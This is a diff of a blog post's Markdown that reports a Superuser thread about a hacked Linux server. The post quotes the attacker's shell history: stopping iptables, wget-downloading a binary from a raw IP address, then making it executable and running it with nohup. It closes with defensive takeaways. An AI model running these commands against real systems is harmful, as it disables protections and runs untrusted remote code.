@@ -4,13 +4,11 @@ title:  "Live Hacking attempt thread in StackOverflow"
 summary: "Tường thuật trực tiếp diễn biến các thông tin và thao tác mà hacker dùng trên chính 1 server bị hacked."
 tags: Tech Security
 ---
-> * Thread "Did I just get hacked?": [https://superuser.com/questions/1034137/did-i-just-get-hacked](https://superuser.com/questions/1034137/did-i-just-get-hacked) 
-> * Texts from TheNextWeb: http://thenextweb.com/dd/2016/02/10/developer-watches-as-hackers-break-into-a-server/
+> Thread "Did I just get hacked?": [https://superuser.com/questions/1034137/did-i-just-get-hacked](https://superuser.com/questions/1034137/did-i-just-get-hacked) 
 
-Usually network infrastructure teams try to piece together how they were hacked, but one developer over on Superuser found themselves the audience to exactly how a major hack on their infrastructure unfolded.
+Tường thuật trực tiếp diễn biến các thông tin và thao tác mà hacker dùng trên chính 1 server bị hacked.
 
-User Vaid asked on Superuser if their server was compromised after walking away for an hour break and coming back to hundreds of commands written in the terminal window — it turns out that the server was indeed hacked:
-```
+```shell
   355  service iptables stop
   356  cd /tmp
   357  wget http://222.186.30.209:65534/yjz1
@@ -29,13 +27,12 @@ User Vaid asked on Superuser if their server was compromised after walking away 
   370  chmod 0755 /tmp/yjz
   371  nohup /tmp/yjz > /dev/null 2>&1 &
 ```
-There were hundreds of these types of commands in the terminal, which may look like gibberish if you’re not familiar with Linux. In brief, the attackers broke into the server, stopped the firewall and proceeded to download and execute malicious code repeatedly.
 
-If there’s two big takeaways from the post, it’s these:
-
-1. Use private key authentication on your Linux servers to avoid brute-force attacks
-2. Once a server like this is compromised, it needs to be destroyed
-
-The post is a fascinating and somewhat rare look at how an attack on an innocent Web server can unfold when it’s not secured properly — you can see how the attacker broke in, tinkered with the system and tried to deploy multiple pieces of malware.
-
-Remember, when you put your server online for the world to see it can and will be attacked, so it’s important to secure your internet-facing machines properly.
+> Texts from TheNextWeb: http://thenextweb.com/dd/2016/02/10/developer-watches-as-hackers-break-into-a-server/
+>
+> ---
+>
+> If there’s two big takeaways from the post, it’s these:
+>
+> 1. Use private key authentication on your Linux servers to avoid brute-force attacks
+> 2. Once a server like this is compromised, it needs to be destroyed
